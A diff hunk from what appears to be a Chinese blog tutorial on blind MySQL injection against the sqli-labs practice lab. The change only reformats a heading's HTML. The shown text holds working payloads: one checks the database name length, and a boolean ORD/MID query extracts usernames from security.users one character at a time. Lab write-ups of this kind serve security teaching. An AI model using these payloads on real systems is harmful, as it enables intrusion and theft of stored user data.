@@ -162,8 +162,8 @@ http://192.168.199.129:86/Less-5/?id=-1&#39; or length(database()) = 8 --+ 页�
 <img src="https://raw.githubusercontent.com/Ljierui/Ljierui.github.io/main/MySQL-injection/15.PNG" widith="50%">
 </center>
 <br>
-#### 6、获取列中的数据
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">语句：</span><br><span class="line"><span class="keyword">and</span> ORD(MID((<span class="keyword">SELECT</span><span class="operator">%</span><span class="number">20</span>IFNULL(<span class="built_in">CAST</span>(username <span class="keyword">AS</span> <span class="type">CHAR</span>),<span class="number">0x20</span>)<span class="keyword">FROM</span> security.users <span class="keyword">ORDER</span> <span class="keyword">BY</span> id LIMIT <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span> <span class="number">68</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="6、获取列中的数据"><a href="#6、获取列中的数据" class="headerlink" title="6、获取列中的数据"></a>6、获取列中的数据</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">语句：</span><br><span class="line"><span class="keyword">and</span> ORD(MID((<span class="keyword">SELECT</span><span class="operator">%</span><span class="number">20</span>IFNULL(<span class="built_in">CAST</span>(username <span class="keyword">AS</span> <span class="type">CHAR</span>),<span class="number">0x20</span>)<span class="keyword">FROM</span> security.users <span class="keyword">ORDER</span> <span class="keyword">BY</span> id LIMIT <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span> <span class="number">68</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
 <center>
 <img src="https://raw.githubusercontent.com/Ljierui/Ljierui.github.io/main/MySQL-injection/16.PNG" widith="50%">
 </center>
